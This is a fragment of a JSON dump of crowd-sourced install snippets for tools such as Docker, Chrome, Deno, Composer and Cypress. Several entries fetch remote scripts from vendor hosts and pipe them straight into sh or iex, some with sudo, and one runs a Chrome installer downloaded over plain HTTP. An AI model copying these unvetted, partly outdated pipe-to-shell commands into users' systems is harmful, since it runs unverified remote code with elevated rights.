    "description": "sudo apt-get install cheese \n",
    "reg_date": "2021-10-11T22:07:51.000Z"
  },
  {
    "id": 2734,
    "keyword": null,
    "link": null,
    "title": " install chance in cypress",
    "description": "npm install cypress or npm install cypress --save-dev // Make sure that you have already run npm init  ./node_modules/.bin/cypress open  //to open cypress window, will take 30 secs\nJust install chancejs with npm: npm install chance Then just use it in your test for example: /// <reference types=\"cypress\" /> import Chance from 'Chance'; const chance = new Chance(); describe('Testing chance', function (){    const company =chance.company();    it('type company in duckduckgo.com', function () {         cy.visit('https://duckduckgo.com/')         cy.get('#search_form_input_homepage')         .should('be.visible')         .type(company)     }) }) \n",
    "reg_date": "2021-10-11T22:07:51.000Z"
  },
  {
    "id": 2735,
    "keyword": null,
    "link": null,
    "title": " install chrome apt-get",
    "description": "wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo apt install ./google-chrome-stable_current_amd64.deb\n",
    "reg_date": "2021-10-11T22:07:51.000Z"
  },
  {
    "id": 2736,
    "keyword": null,
    "link": null,
    "title": " install chrome on linux",
    "description": "wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo apt install ./google-chrome-stable_current_amd64.deb\nwget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add -  sudo sh -c 'echo \"deb https://dl.google.com/linux/chrome/deb/ stable main\" >> /etc/apt/sources.list.d/google.list' sudo apt-get update sudo apt-get install google-chrome-stable \nsudo apt update sudo apt upgrade sudo apt install wget wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb sudo dpkg -i google-chrome-stable_current_amd64.deb sudo apt-get install -f google-chrome\nwget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb  sudo dpkg -i google-chrome-stable_current_amd64.deb\nsudo dpkg -i google-chrome-stable_current_amd64.deb\nchrome \n",
    "reg_date": "2021-10-11T22:07:51.000Z"
  },
  {
    "id": 2737,
    "keyword": null,
    "link": null,
    "title": " install chrome powershell",
    "description": "$LocalTempDir = $env:TEMP; $ChromeInstaller = \"ChromeInstaller.exe\"; (new-object    System.Net.WebClient).DownloadFile('http://dl.google.com/chrome/install/375.126/chrome_installer.exe', \"$LocalTempDir\\$ChromeInstaller\"); & \"$LocalTempDir\\$ChromeInstaller\" /silent /install; $Process2Monitor =  \"ChromeInstaller\"; Do { $ProcessesFound = Get-Process | ?{$Process2Monitor -contains $_.Name} | Select-Object -ExpandProperty Name; If ($ProcessesFound) { \"Still running: $($ProcessesFound -join ', ')\" | Write-Host; Start-Sleep -Seconds 2 } else { rm \"$LocalTempDir\\$ChromeInstaller\" -ErrorAction SilentlyContinue -Verbose } } Until (!$ProcessesFound)\n",
    "reg_date": "2021-10-11T22:07:52.000Z"
  },
  {
    "id": 2738,
    "keyword": null,
    "link": null,
    "title": " install chromedriver linux command line",
    "description": "wget https://chromedriver.storage.googleapis.com/2.41/chromedriver_linux64.zip unzip chromedriver_linux64.zip \nsudo apt-get install unzip && a=$(uname -m) && rm -r /tmp/chromedriver/ mkdir /tmp/chromedriver/ && wget -O /tmp/chromedriver/LATEST_RELEASE http://chromedriver.storage.googleapis.com/LATEST_RELEASE && if [ $a == i686 ]; then b=32; elif [ $a == x86_64 ]; then b=64; fi && latest=$(cat /tmp/chromedriver/LATEST_RELEASE) && wget -O /tmp/chromedriver/chromedriver.zip 'http://chromedriver.storage.googleapis.com/'$latest'/chromedriver_linux'$b'.zip' && sudo unzip /tmp/chromedriver/chromedriver.zip chromedriver -d /usr/local/bin/ && echo 'success?'\nnpm install chromedriver\n",
    "reg_date": "2021-10-11T22:07:52.000Z"
  },
  {
    "id": 2739,
    "keyword": null,
    "link": null,
    "title": " install cmake anaconda",
    "description": "conda install -c anaconda cmake\n",
    "reg_date": "2021-10-11T22:07:52.000Z"
  },
  {
    "id": 2740,
    "keyword": null,
    "link": null,
    "title": " install cmake ubuntu",
    "description": "For Ubuntu: sudo apt-get install cmake\ncmake --version\n",
    "reg_date": "2021-10-11T22:07:52.000Z"
  },
  {
    "id": 2741,
    "keyword": null,
    "link": null,
    "title": " install cocoapods",
    "description": "$ sudo gem install cocoapods \npod --version\n",
    "reg_date": "2021-10-11T22:07:52.000Z"
  },
  {
    "id": 2742,
    "keyword": null,
    "link": null,
    "title": " install composer on linux",
    "description": "# The following method has been tested on Ubuntu 20.04 # But i think it should work fine with any other distribution  # Ensure you're on Desktop, to prevent issues with permissions cd ~/Desktop  # Download the installer script php -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"  # Verify intergrity to check whether an error happened during the fetch php -r \"if (hash_file('sha384', 'composer-setup.php') === '8a6138e2a05a8c28539c9f0fb361159823655d7ad2deecb371b04a83966c61223adc522b0189079e3e9e277cd72b8897') { echo 'Installer verified'; } else { echo 'Installer corrupt'; unlink('composer-setup.php'); } echo PHP_EOL;\"  # Download composer script, which is the actual composer file php composer-setup.php  # Remove the installer script as it's no longer needed php -r \"unlink('composer-setup.php');\"  # To use composer globally, it's a good idea to move it to the path # /usr/local/bin sudo mv composer.phar /usr/local/bin/composer  # Try running composer to see if everything works fine composer -V # If you see the following output, then you're good to go: # Composer version 1.10.10 2020-08-03 11:35:19 \nphp -r \"copy('https://getcomposer.org/installer', 'composer-setup.php');\"\n// Adding permissions after installing Composer on Mac OSX sudo chmod 755 /usr/local/bin/composer.phar\n",
    "reg_date": "2021-10-11T22:07:52.000Z"
  },
  {
    "id": 2743,
    "keyword": null,
    "link": null,
    "title": " install composer using brew",
    "description": "brew install composer\n",
    "reg_date": "2021-10-11T22:07:52.000Z"
  },
  {
    "id": 2744,
    "keyword": null,
    "link": null,
    "title": " install cors",
    "description": " npm install cors\nvar allowedOrigins = ['http://localhost:3000',                       'http://yourapp.com']; app.use(cors({     origin: function(origin, callback){     // allow requests with no origin          // (like mobile apps or curl requests)         if(!origin)        return callback(null, true);         if(allowedOrigins.indexOf(origin) === -1){       var msg = 'The CORS policy for this site does not ' +                           'allow access from the specified Origin.';             return callback(new Error(msg), false);         }         return callback(null, true);     } }));\ninstallation :  $ npm i cors  usage :  var express = require('express') var cors = require('cors') var app = express()   app.use(cors())   app.get('/products/:id', function (req, res, next) {   res.json({msg: 'This is CORS-enabled for all origins!'}) })   app.listen(80, function () {   console.log('CORS-enabled web server listening on port 80') }) \nvar express = require('express')var cors = require('cors')var app = express() app.get('/products/:id', cors(), function (req, res, next) {  res.json({msg: 'This is CORS-enabled for a Single Route'})}) app.listen(80, function () {  console.log('CORS-enabled web server listening on port 80')})\nvar express = require('express')var cors = require('cors')var app = express() app.use(cors()) app.get('/products/:id', function (req, res, next) {  res.json({msg: 'This is CORS-enabled for all origins!'})}) app.listen(80, function () {  console.log('CORS-enabled web server listening on port 80')})\n",
    "reg_date": "2021-10-11T22:07:53.000Z"
  },
  {
    "id": 2745,
    "keyword": null,
    "link": null,
    "title": " install curl in alpine linux",
    "description": "FROM openjdk:8-jre-alpine  RUN apk add --update \\     curl \\     && rm -rf /var/cache/apk/* \n",
    "reg_date": "2021-10-11T22:07:53.000Z"
  },
  {
    "id": 2746,
    "keyword": null,
    "link": null,
    "title": " install curl mac",
    "description": "brew install curl\n",
    "reg_date": "2021-10-11T22:07:53.000Z"
  },
  {
    "id": 2747,
    "keyword": null,
    "link": null,
    "title": " install curl on ubuntu",
    "description": "sudo apt-get update sudo apt-get install curl\n sudo apt-get install curl\ncurl -o vue-v2.6.10.js https://cdn.jsdelivr.net/npm/vue/dist/vue.js\ncurl -O https://cdn.jsdelivr.net/npm/vue/dist/vue.js\ncurl -O http://mirrors.edge.kernel.org/archlinux/iso/2018.06.01/archlinux-2018.06.01-x86_64.iso  \\     -O https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-9.4.0-amd64-netinst.iso\n",
    "reg_date": "2021-10-11T22:07:53.000Z"
  },
  {
    "id": 2748,
    "keyword": null,
    "link": null,
    "title": " install curl ubuntu",
    "description": "sudo apt-get update sudo apt-get install curl\n sudo apt-get install curl\ncurl -o vue-v2.6.10.js https://cdn.jsdelivr.net/npm/vue/dist/vue.js\ncurl -O https://cdn.jsdelivr.net/npm/vue/dist/vue.js\ncurl -O http://mirrors.edge.kernel.org/archlinux/iso/2018.06.01/archlinux-2018.06.01-x86_64.iso  \\     -O https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-9.4.0-amd64-netinst.iso\n",
    "reg_date": "2021-10-11T22:07:53.000Z"
  },
  {
    "id": 2749,
    "keyword": null,
    "link": null,
    "title": " install cypress",
    "description": "cd /your/project/path npm init npm install cypress --save-dev\nnpm install cypress or npm install cypress --save-dev // Make sure that you have already run npm init  ./node_modules/.bin/cypress open  //to open cypress window, will take 30 secs\n./node_modules/.bin/cypress open\n./node_modules/.bin/cypress open   // just cypress open wont work\n//Install Cypress npm install cypress --save-dev or yarn add cypress --dev  //Open Cypress node_modules/.bin/cypress open  or  add \"cypress\": \"cypress open\" in your package.json then npm run cypress \nI think you're looking for --spec path/to/folder/*.js  You can run all the tests in a folder, or even in all subfolders of a folder  example:  --spec cypresss/integration/subsetA/**/*.js would run all .js files in all folders under the \"subsetA\" folder in cypress/integration. \n",
    "reg_date": "2021-10-11T22:07:53.000Z"
  },
  {
    "id": 2750,
    "keyword": null,
    "link": null,
    "title": " install datetime",
    "description": "pip install datetime\nfrom DateTime import DateTime e = DateTime('US/Eastern') e.timezone() 'US/Eastern' \n",
    "reg_date": "2021-10-11T22:07:53.000Z"
  },
  {
    "id": 2751,
    "keyword": null,
    "link": null,
    "title": " install dateutil",
    "description": "pip install python-dateutil\n",
    "reg_date": "2021-10-11T22:07:53.000Z"
  },
  {
    "id": 2752,
    "keyword": null,
    "link": null,
    "title": " install deb file",
    "description": "sudo dpkg -i /path/to/deb/file sudo apt-get install -f\nsudo dpkg -i package_file.deb\nsudo apt install ./file_name.deb\nsudo apt install path_to_deb_file\n#install downloaded .deb sudo dpkg -i /path/name.deb  #install packages sudo apt install package_name\nInstall a downloaded program in Ubuntu - Linux sudo dpkg -i package_file.deb //or sudo apt install path_to_deb_file\n",
    "reg_date": "2021-10-11T22:07:54.000Z"
  },
  {
    "id": 2753,
    "keyword": null,
    "link": null,
    "title": " install deno",
    "description": " #Using Shell (macOS and Linux): curl -fsSL https://deno.land/x/install/install.sh | sh  #Using PowerShell (Windows): iwr https://deno.land/x/install/install.ps1 -useb | iex   #Using Scoop (Windows): scoop install deno  #Using Chocolatey (Windows): choco install deno  #Using Homebrew (macOS): brew install deno  #Using Cargo (Windows, macOS, Linux): cargo install deno\n$iwr https://deno.land/x/install/install.ps1 -useb | iex\n$curl -fsSL https://deno.land/x/install/install.sh | sh\n$deno run https://deno.land/std/examples/welcome.ts\n$brew install deno\n",
    "reg_date": "2021-10-11T22:07:54.000Z"
  },
  {
    "id": 2754,
    "keyword": null,
    "link": null,
    "title": " install dependencies @material-ui/lab/Rating",
    "description": "yarn add @material-ui/lab \n",
    "reg_date": "2021-10-11T22:07:54.000Z"
  },
  {
    "id": 2755,
    "keyword": null,
    "link": null,
    "title": " install dependencies react project material ui",
    "description": "// usando npm npm install @material-ui/core  // usando yarn yarn add @material-ui/core\n",
    "reg_date": "2021-10-11T22:07:54.000Z"
  },
  {
    "id": 2756,
    "keyword": null,
    "link": null,
    "title": " install dirsearch",
    "description": "git clone https://github.com/maurosoria/dirs3arch.git ln -s $PWD/dirs3arch/dirsearch.py $CTF_ROOT/bin/dirsearch\n",
    "reg_date": "2021-10-11T22:07:54.000Z"
  },
  {
    "id": 2757,
    "keyword": null,
    "link": null,
    "title": " install discord bot on server",
    "description": "sudo apt install npm sudo apt install npm pm@latest git clone <url> #or upload it via ftp or smb #cd into folder where the projekt is strored sudo npm i -g pm2 sudo pm2 start <your main file> sudo pm2 monit #check if botis running\n//discord.js is probably the easiest to learn. To install do this //in command prompt (Windows, Linux) or terminal (Mac)  npm init //and then npm i discord.js  //after that just read the discord.js.org documentation //and follow a couple yt guides, maybe join some servers.\nfollow this https://discordpy.readthedocs.io/en/latest/discord.html to make bot account  use discord api of your laugaungue of choice discord.py https://discordpy.readthedocs.io/en/latest/index.html discord.js  https://discord.js.org/#/ \n",
    "reg_date": "2021-10-11T22:07:54.000Z"
  },
  {
    "id": 2758,
    "keyword": null,
    "link": null,
    "title": " install discord in ubunut",
    "description": "$ sudo snap install discord discord 0.0.9 from Snapcrafters installed \n",
    "reg_date": "2021-10-11T22:07:54.000Z"
  },
  {
    "id": 2759,
    "keyword": null,
    "link": null,
    "title": " install discord manjaro",
    "description": "sudo snap install discord\n",
    "reg_date": "2021-10-11T22:07:55.000Z"
  },
  {
    "id": 2760,
    "keyword": null,
    "link": null,
    "title": " install discord module py",
    "description": "# Linux/macOS python3 -m pip install -U discord.py  # Windows py -3 -m pip install -U discord.py\n",
    "reg_date": "2021-10-11T22:07:55.000Z"
  },
  {
    "id": 2761,
    "keyword": null,
    "link": null,
    "title": " install discord on ubuntu",
    "description": "$ sudo snap install discord discord 0.0.9 from Snapcrafters installed \nsudo snap install discord\n",
    "reg_date": "2021-10-11T22:07:55.000Z"
  },
  {
    "id": 2762,
    "keyword": null,
    "link": null,
    "title": " install discord ubuntu",
    "description": "$ sudo snap install discord discord 0.0.9 from Snapcrafters installed \nsudo snap install discord\nsnap install discord\n",
    "reg_date": "2021-10-11T22:07:55.000Z"
  },
  {
    "id": 2763,
    "keyword": null,
    "link": null,
    "title": " install django channels",
    "description": "pip install channels\n",
    "reg_date": "2021-10-11T22:07:55.000Z"
  },
  {
    "id": 2764,
    "keyword": null,
    "link": null,
    "title": " install django ubuntu 20.04",
    "description": "sudo apt update python3 -V # you need python sudo apt install python3-django django-admin --version\n",
    "reg_date": "2021-10-11T22:07:55.000Z"
  },
  {
    "id": 2765,
    "keyword": null,
    "link": null,
    "title": " install docker-compose ubuntu",
    "description": "sudo curl -L \"https://github.com/docker/compose/releases/download/1.26.0/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.26.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose \nsudo curl -L \"https://github.com/docker/compose/releases/download/1.28.0/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose \nsudo chmod +x /usr/local/bin/docker-compose \n",
    "reg_date": "2021-10-11T22:07:55.000Z"
  },
  {
    "id": 2766,
    "keyword": null,
    "link": null,
    "title": " install docker-compose ubuntu 20",
    "description": "sudo curl -L \"https://github.com/docker/compose/releases/download/1.26.0/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose docker-compose --version\n",
    "reg_date": "2021-10-11T22:07:55.000Z"
  },
  {
    "id": 2767,
    "keyword": null,
    "link": null,
    "title": " install docker compose",
    "description": "sudo curl -L \"https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose\n1 - VERIFY SYSTEM IS CURRENTLY UPDATED # yum check-update  2 - INSTALL DOCKER # curl -fsSL https://get.docker.com/ |sh  # download and install docker Start & Enable Docker # systemctl start docker && systemctl enable docker As your self (not root), add your user to the docker group $ sudo usermod -aG docker $(whoami)  3 - INSTALL DOCKER-COMPOSE $ latest=$(curl -s https://raw.githubusercontent.com/docker/docker.github.io/master/_config.yml|grep \"^compose_version\"|awk '{print $2}'|sed 's/\\\"//g') $ sudo curl -L \"https://github.com/docker/compose/releases/download/${latest}/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose $ sudo chmod +x /usr/local/bin/docker-compose\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.28.5/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.26.0/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose \nsudo curl -L \"https://github.com/docker/compose/releases/download/1.25.4/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose \n",
    "reg_date": "2021-10-11T22:07:56.000Z"
  },
  {
    "id": 2768,
    "keyword": null,
    "link": null,
    "title": " install docker compose homebrew",
    "description": "brew install docker-compose\n",
    "reg_date": "2021-10-11T22:07:56.000Z"
  },
  {
    "id": 2769,
    "keyword": null,
    "link": null,
    "title": " install docker in ubuntu",
    "description": "sudo apt-get update sudo apt-get upgrade sudo apt install docker.io systemctl start docker systemctl enable docker docker --version\n$ sudo apt-get remove docker docker-engine docker.io $ sudo apt-get update $ sudo apt install docker.io $ sudo snap install docker $ docker --version\nsystemctl start docker # to start docker from terminal\n $ sudo apt-get update  $ sudo apt-get install docker-ce docker-ce-cli containerd.io \n$ curl -fsSL https://get.docker.com -o get-docker.sh $ sudo sh get-docker.sh  <output truncated> \nsudo apt install docker.io -y\n",
    "reg_date": "2021-10-11T22:07:56.000Z"
  },
  {
    "id": 2770,
    "keyword": null,
    "link": null,
    "title": " install docker kali linux",
    "description": "kali@kali:~$ sudo apt update kali@kali:~$ kali@kali:~$ sudo apt install -y docker.io kali@kali:~$ kali@kali:~$ sudo systemctl enable docker --now kali@kali:~$ kali@kali:~$ docker kali@kali:~$\n",
    "reg_date": "2021-10-11T22:07:56.000Z"
  },
  {
    "id": 2771,
    "keyword": null,
    "link": null,
    "title": " install docker nvidia 2",
    "description": "# Setting up Docker curl https://get.docker.com | sh \\   && sudo systemctl --now enable docker    # Setting up NVIDIA Container Toolkit distribution=$(. /etc/os-release;echo $ID$VERSION_ID) \\    && curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add - \\    && curl -s -L https://nvidia.github.io/nvidia-docker/$distribution/nvidia-docker.list | sudo tee /etc/apt/sources.list.d/nvidia-docker.list  sudo apt-get update  sudo apt-get install -y nvidia-docker2  sudo systemctl restart docker  sudo docker run --rm --gpus all nvidia/cuda:11.0-base nvidia-smi\n",
    "reg_date": "2021-10-11T22:07:56.000Z"
  },
  {
    "id": 2772,
    "keyword": null,
    "link": null,
    "title": " install docker on centos",
    "description": "sudo yum update sudo yum install yum-utils device-mapper-persistent-data lvm2  sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo sudo yum install docker-ce -y sudo systemctl start docker sudo systemctl enable docker sudo systemctl status docker sudo docker -v\n# First add repo to yum config manager sudo yum install -y yum-utils sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo # Use added repo to install and start docker sudo yum install docker-ce docker-ce-cli containerd.io sudo systemctl start docker # Optional: Validate by run sample image  sudo docker run hello-world\n# To install docker on centos 7 or SL7 # From https://docs.docker.com/engine/install/centos/ sudo yum install -y yum-utils sudo yum-config-manager \\     --add-repo \\     https://download.docker.com/linux/centos/docker-ce.repo # From https://stackoverflow.com/questions/45272827/docker-ce-on-rhel-requires-container-selinux-2-9 # You must add the latest container-selinux form http://mirror.centos.org/centos/7/extras/x86_64/Packages/ # This version is correct as of 11-3-2020: sudo yum install -y \\     http://mirror.centos.org/centos/7/extras/x86_64/Packages/container-selinux-2.119.2-1.911c772.el7_8.noarch.rpm # Now you can continue w/ the Docker installation sudo yum install -y docker-ce docker-ce-cli containerd.io # To start and check the version sudo systemctl start docker sudo systemctl enable docker sudo docker -v\ndnf config-manager --add-repo=https://download.docker.com/linux/centos/docker-ce.repo\nsystemctl start docker\n$ sudo yum remove docker \\                   docker-client \\                   docker-client-latest \\                   docker-common \\                   docker-latest \\                   docker-latest-logrotate \\                   docker-logrotate \\                   docker-engine \n",
    "reg_date": "2021-10-11T22:07:57.000Z"
  },
  {
    "id": 2773,
    "keyword": null,
    "link": null,
    "title": " install docker on debian",
    "description": "# Install docker sudo apt install -y apt-transport-https ca-certificates curl gnupg2 software-properties-common curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/debian $(lsb_release -cs) stable\" sudo apt update apt-cache policy docker-ce sudo apt install -y docker-ce  # Install docker-compose sudo curl -L \"https://github.com/docker/compose/releases/download/1.27.4/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose\nDelete any outdated packages:  sudo apt-get purge docker lxc-docker docker-engine docker.io  Update the default respository:  sudo apt-get update  Download the following dependencies:  sudo apt-get install apt-transport-https ca-certificates curl gnupg2 software-properties-common  Download Docker&rsquo;s official GPG key to verify the integrity of packages curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -  Add the Docker repository to your system repository sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/debian buster stable\"  Update the apt repository: sudo apt-get update  Install Docker Engine and containerd: sudo apt-get install docker-ce docker-ce-cli containerd.io  Check the status by typing: systemctl status docker  Another way to check the installation: docker -v  Optional: Verify the Installation With a Hello World Image docker run hello-world  To remove docker: sudo apt-get purge docker-ce sudo rm -rf /var/lib/docker\n $ sudo apt-get update  $ sudo apt-get install docker-ce docker-ce-cli containerd.io \nsudo apt-get purge docker lxc-docker docker-engine docker.io\nsudo apt -y install apt-transport-https ca-certificates curl gnupg2 software-properties-common\n$ curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg \n",
    "reg_date": "2021-10-11T22:07:57.000Z"
  },
  {
    "id": 2774,
    "keyword": null,
    "link": null,
    "title": " install docker on manjaro linux",
    "description": "sudo pacman -S docker sudo usermod -aG docker $USER sudo systemctl enable --now docker sudo systemctl status docker\n",
    "reg_date": "2021-10-11T22:07:57.000Z"
  },
  {
    "id": 2775,
    "keyword": null,
    "link": null,
    "title": " install docker raspberry",
    "description": "sudo apt-get update && sudo apt-get upgrade\ncurl -sSL https://get.docker.com | sh \n",
    "reg_date": "2021-10-11T22:07:57.000Z"
  },
  {
    "id": 2776,
    "keyword": null,
    "link": null,
    "title": " install docker ubuntu 18.04",
    "description": "sudo apt-get update sudo apt-get upgrade sudo apt install docker.io systemctl start docker systemctl enable docker docker --version\n# First check if there are any updates sudo apt-get update  # allow apt to use repositories over the HTTPS protocol sudo apt-get install \\     apt-transport-https \\     ca-certificates \\     curl \\     gnupg-agent \\     software-properties-common  # Add docker's official GPG key by executing following command curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -  # Add docker's repositories sudo add-apt-repository \\    \"deb [arch=amd64] https://download.docker.com/linux/ubuntu \\    $(lsb_release -cs) \\    stable\"  # update and install docker sudo apt-get install docker-ce docker-ce-cli containerd.io\n $ sudo apt-get update  $ sudo apt-get install docker-ce docker-ce-cli containerd.io \nsudo apt install docker-ce https://www.digitalocean.com/community/tutorials/how-to-install-and-use-docker-on-ubuntu-18-04\n$ curl -fsSL https://get.docker.com -o get-docker.sh $ sudo sh get-docker.sh  <output truncated> \nsudo apt install docker.io -y\n",
    "reg_date": "2021-10-11T22:07:57.000Z"
  },
  {
    "id": 2777,
    "keyword": null,
    "link": null,
    "title": " install dotenv",
    "description": "# Install dotenv via: pip3 install python-dotenv  # Load .env file using: from dotenv import load_dotenv load_dotenv()  # Use the variable with: import os os.getenv(\"ACCESS_KEY\") \n# For python users only pip install python-dotenv\nrequire('dotenv').config();  console.log(process.env.MY_ENV_VAR);\n# with npm  npm install dotenv   # or with Yarn  yarn add dotenv\npip install python-dotenv\n# with npm npm install dotenv  # or with Yarn yarn add dotenv\n",
    "reg_date": "2021-10-11T22:07:57.000Z"
  },
  {
    "id": 2778,
    "keyword": null,
    "link": null,
    "title": " install dotnet core ubuntu",
    "description": "# add the Microsoft package signing key to your list of trusted keys  # and add the package repository. wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb  # if you want to develop applications then you need to install the SDK sudo apt-get update; \\   sudo apt-get install -y apt-transport-https && \\   sudo apt-get update && \\   sudo apt-get install -y dotnet-sdk-3.1    # if all you want to do is to run the applications made with .NET Core # then you don't need to install the whole SDK, just install the runtime sudo apt-get update; \\   sudo apt-get install -y apt-transport-https && \\   sudo apt-get update && \\   sudo apt-get install -y aspnetcore-runtime-3.1\nwget https://packages.microsoft.com/config/ubuntu/19.10/packages-microsoft-prod.deb -O packages-microsoft-prod.deb sudo dpkg -i packages-microsoft-prod.deb \n",
    "reg_date": "2021-10-11T22:07:57.000Z"
  },
  {
    "id": 2779,
    "keyword": null,
    "link": null,
    "title": " install dropbox ubuntu",
    "description": "sudo apt-get install nautilus-dropbox\n",
    "reg_date": "2021-10-11T22:07:57.000Z"
  },
  {
    "id": 2780,
    "keyword": null,
    "link": null,
    "title": " install elasticsearch ubuntu 20.04",
    "description": "curl -fsSL https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add - echo \"deb https://artifacts.elastic.co/packages/7.x/apt stable main\" | sudo tee -a /etc/apt/sources.list.d/elastic-7.x.list sudo apt update sudo apt install elasticsearch\n Installing and Configuring the Kibana Dashboard sudo apt install kibana sudo systemctl enable kibana sudo systemctl start kibana echo \"kibanaadmin:`openssl passwd -apr1`\" | sudo tee -a /etc/nginx/htpasswd.users  Visit for more info: https://www.digitalocean.com/community/tutorials/how-to-install-elasticsearch-logstash-and-kibana-elastic-stack-on-ubuntu-20-04\n",
    "reg_date": "2021-10-11T22:07:58.000Z"
  },
  {
    "id": 2781,
    "keyword": null,
    "link": null,
    "title": " install elixir ubuntu",
    "description": "wget https://packages.erlang-solutions.com/erlang-solutions_2.0_all.deb && sudo dpkg -i erlang-solutions_2.0_all.deb sudo apt-get update sudo apt-get install esl-erlang sudo apt-get install elixir\n",
    "reg_date": "2021-10-11T22:07:58.000Z"
  },
  {
    "id": 2782,
    "keyword": null,
    "link": null,
    "title": " install en web core md",
    "description": "python -m spacy download en_core_web_md\n",
    "reg_date": "2021-10-11T22:07:58.000Z"
  },
  {
    "id": 2783,
    "keyword": null,
    "link": null,
    "title": " install entity framework in visual studio 2019 command",
    "description": "Install-Package EntityFramework\n",
    "reg_date": "2021-10-11T22:07:58.000Z"
  },
  {
    "id": 2784,
    "keyword": null,
    "link": null,
    "title": " install epel amazon linux 2",
    "description": "sudo amazon-linux-extras install epel -y\n",
    "reg_date": "2021-10-11T22:07:58.000Z"
  },
  {
    "id": 2785,
    "keyword": null,
    "link": null,
    "title": " install epel repo centos 7",
    "description": "cd /tmp wget https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm ls *.rpm\n",
    "reg_date": "2021-10-11T22:07:58.000Z"
  },
  {
    "id": 2786,
    "keyword": null,
    "link": null,
    "title": " install erlang cent os 8",
    "description": "sudo dnf groupinstall \"Development Tools\" mkdir erliex && cd erliex  # source : https://idroot.us/install-erlang-centos-8/ sudo dnf install epel-release sudo dnf update wget https://github.com/rabbitmq/erlang-rpm/releases/download/v23.1.5/erlang-23.1.5-1.el8.x86_64.rpm sudo dnf install erlang-23.1.5-1.el8.x86_64.rpm  mkdir erliex && cd erliex  # install elixir sudo curl -LO https://github.com/elixir-lang/elixir/releases/download/v1.10.3/Precompiled.zip  # Extract elixir and move it to the appropriate location sudo unzip Precompiled.zip sudo cp -rf bin/* /usr/bin/ sudo cp -rf lib/* /lib/ sudo cp -rf man/* /usr/share/man/  # Remove leftover files sudo cd .. && rm -rf erliex/  # Exit message echo \"Instalation complete!\"\n",
    "reg_date": "2021-10-11T22:07:58.000Z"
  },
  {
    "id": 2787,
    "keyword": null,
    "link": null,
    "title": " install eslint",
    "description": "npm install -g eslint \n$ npm install eslint --save-dev $ ./node_modules/.bin/eslint --init\n#install globally npm i -g eslint  #install in project npm install eslint --save-dev\nnpm install eslint --save-dev  # or  yarn add eslint --dev \n// package.json \"devDependencies\": {     \"eslint\": \"^7.2.0\", \t\"eslint-plugin-node\": \"^11.1.0\" }  // .eslintrc.json {    \"extends\": [       \"eslint:recommended\",       \"plugin:node/recommended\"    ],    \"parserOptions\": {       // Only ESLint 6.2.0 and later support ES2020.       \"ecmaVersion\": 2020    },    \"rules\": {       \"node/exports-style\": [\"error\", \"module.exports\"],       \"node/file-extension-in-import\": [\"error\", \"always\"],       \"node/prefer-global/buffer\": [\"error\", \"always\"],       \"node/prefer-global/console\": [\"error\", \"always\"],       \"node/prefer-global/process\": [\"error\", \"always\"],       \"node/prefer-global/url-search-params\": [\"error\", \"always\"],       \"node/prefer-global/url\": [\"error\", \"always\"],       \"node/prefer-promises/dns\": \"error\",       \"node/prefer-promises/fs\": \"error\"    } }\nyarn add eslint -D \n",
    "reg_date": "2021-10-11T22:07:58.000Z"
  },
  {
    "id": 2788,
    "keyword": null,
    "link": null,
    "title": " install exact version npm",
    "description": "npm install <package>@<version>  //example npm install express@3.0.0\n$ npm install express@4.16.1  + express@4.16.1 added 48 packages from 36 contributors and audited 121 packages in 2.986s found 0 vulnerabilities \n",
    "reg_date": "2021-10-11T22:07:58.000Z"
  },
  {
    "id": 2789,
